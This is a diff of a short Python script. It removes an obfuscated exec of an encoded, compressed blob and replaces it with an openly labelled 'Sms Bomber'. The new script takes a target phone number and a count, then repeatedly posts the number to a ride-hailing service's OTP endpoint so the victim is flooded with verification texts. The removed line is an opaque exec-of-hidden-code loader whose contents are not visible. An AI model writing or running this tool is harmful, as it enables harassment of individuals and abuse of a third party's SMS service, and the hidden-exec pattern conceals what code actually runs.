@@ -1,2 +1,32 @@
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("eJyVU81u00AQnk3StHFT+oNELhz2UIkcSFyBikQFVQX940CEEqRKbiLXrVfNFsd2vWvUg8WlD8CRN+GBeA4kmBknqYo4wHr/5ptvZr5drS9g2mo49nCYmgAIsQuIADwx21fAq/C+AlEVJjXwaiBUDa4WIKxC6+hY1UEtwhSpQYt2S9AKF6B1KwC714B7nPrfOM7Mu3jnXaL0YQO8ZdACVANCB154Tbg5AbUC4TIoB24rsD86BO8BKAFXq3ALqK4CV2sQNimxIHgdFJKbRPY2ZoVW7go9oELX3+EEDzxor+Jt6F/Yem28ErB0Q4dJpsxPNB1H+tTkH82fjrl9j+S4jBT3Y4rpN7c5ydx2hvKs0+liWp+6zykowC+m1NJFKcjDhlPGDOUTX54hNHQRLQoWN6uHriGuLrnR8AvHHfq+K905A02mlJ8/35FYYhYsj47olmp4kDnkLeV76pfwkC02MMjx/7U5zo9vX+X7TA6SsdKRPM57VvUZHEyMfJNMzlVWcpR8ty8/qqjbz8/1J7kj995m/vNInWfaaqZ8GCexknFOMejferm1vcXtf/SYNXwJp9NcNsgutZUjU0VQvt41Dq69sgDqswtoDpBkTQV33a7ZxmVsbWp2XDdI066JabbBjUaTRycNjFHxpco6SZDbsfv5mZvY1DYw8kJFUUqFNf20mnJy5dMvI7PEsjAylKP2Q3qyhGTqOlfGGlstDX7HVk8Uey+SKMmCSdCndCz2qH9w0GOyji0jOk5zy0j/YJ8RVsAIXiWveRZx4jCwAVOyAA9g6cfRdpFUKmN0ErPPREqlTE8TY5mUtUnA3cS3FV6yxleTJMwjtUs88xinpmiKNVFfr1c2xaZoibpYEY+Eg/OG+A0S2x98"))))
+import requests as req
+import time
+from colorama import Fore
+print(Fore.GREEN+'''
+
+ _____                _   _           _____         
+/  ___|              | | | |         |_   _|        
+\ `--. _ __ ___  ___ | |_| |_   _ _ __ | | ___ _ __ 
+ `--. \ '_ ` _ \/ __||  _  | | | | '_ \| |/ _ \ '__|
+/\__/ / | | | | \__ \| | | | |_| | | | | |  __/ |   
+\____/|_| |_| |_|___/\_| |_/\__,_|_| |_\_/\___|_|   
+
+_________________________________________
+
+● Mr Soheil HuNteR
+● Sms Bomber
+● Me ID Tel.Rubik : @Cr_3lebriti
+● Phone number : 0905000000
+_________________________________________
+
+''')
+
+phone=int(input(Fore.GREEN+"[ Phone targit ]"+Fore.RED+" =>" ))
+num =int(input(Fore.GREEN+"Number Sms"+Fore.RED+" =>" ))
+print(Fore.GREEN+"Start"+Fore.RED+"..")
+url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
+data ={"cellphone": phone}
+for i in range(0,num):
+    req.session()
+    time.sleep(2)
+    r =req.post(url,data)
+    print(Fore.GREEN+"[~]"+Fore.RED+"[ send ]")
